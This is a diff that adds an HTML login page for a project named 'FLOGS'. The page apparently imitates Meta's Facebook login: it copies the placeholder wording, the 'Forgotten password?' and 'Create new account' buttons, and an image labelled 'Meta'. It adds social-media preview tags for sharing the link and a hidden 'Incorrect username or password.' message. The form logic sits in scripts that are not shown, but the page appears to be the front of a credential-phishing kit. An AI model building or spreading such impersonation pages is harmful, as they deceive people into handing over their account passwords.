@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login</title>
+  
+  <!-- Open Graph Meta Tags for Social Media Preview -->
+  <meta property="og:title" content="FLOGS - Login">
+  <meta property="og:description" content="Log in to FLOGS">
+  <meta property="og:image" content="https://raw.githubusercontent.com/Igbined/FLOGS-2.0/master/IMAGES/6a4d9613-4e5c-41fd-bb65-b6f49326f87b.jpeg">
+  <meta property="og:url" content="https://github.com/Igbined/FLOGS-2.0">
+  <meta property="og:type" content="website">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/Igbined/FLOGS-2.0/master/IMAGES/6a4d9613-4e5c-41fd-bb65-b6f49326f87b.jpeg">
+  
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-white flex items-center justify-center min-h-screen">
+
+  <div class="w-full max-w-sm px-6">
+
+    <!-- Logo -->
+    <div class="flex justify-center mb-14">
+      <a href="../index.html">
+        <img src="../IMAGES/IMG_0085.png" alt="App" class="w-16 h-16" />
+      </a>
+    </div>
+
+    <form id="loginForm" class="space-y-4">
+      <!-- Username -->
+      <input
+        id="username"
+        name="username"
+        type="text"
+        placeholder="Username, mobile number or email address"
+        class="w-full mb-3 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
+      />
+
+      <!-- Password -->
+      <input
+        id="password"
+        name="password"
+        type="password"
+        placeholder="Password"
+        class="w-full mb-4 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
+      />
+
+      <!-- Login Button -->
+      <button
+        id="loginBtn"
+        type="submit"
+        class="w-full bg-blue-600 text-white text-sm font-normal py-3 rounded-lg mb-4
+               transition active:scale-95 disabled:opacity-70 disabled:cursor-not-allowed
+               flex items-center justify-center gap-2"
+      >
+        <span id="btnText">Log in</span>
+        <svg id="spinner" class="w-5 h-5 animate-spin hidden" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" stroke-opacity="0.3"/>
+          <path d="M22 12a10 10 0 0 1-10 10" stroke="currentColor" stroke-width="4" stroke-linecap="round"/>
+        </svg>
+      </button>
+
+      <!-- Error Message -->
+      <div id="errorMsg" class="text-red-500 text-sm mb-6 hidden text-center">
+        Incorrect username or password.
+      </div>
+    </form>
+
+    <!-- Forgotten Password -->
+    <div class="text-center mb-6">
+      <a href="#" class="text-sm font-normal text-black hover:underline">
+        Forgotten password?
+      </a>
+    </div>
+
+    <!-- Bottom Section -->
+    <div class="mt-16">
+      <button class="w-full border border-blue-600 text-blue-600 text-sm font-normal py-3 rounded-md mb-8 hover:bg-blue-50 transition">
+        Create new account
+      </button>
+
+      <div class="flex justify-center mt-2">
+        <a href="../index.html">
+          <img src="../IMAGES/IMG_0084.png" alt="Meta" class="h-8" />
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <script src="../JS/login.js" defer></script>
+  <script src="../JS/config.js" defer></script>
+</body>
+</html>
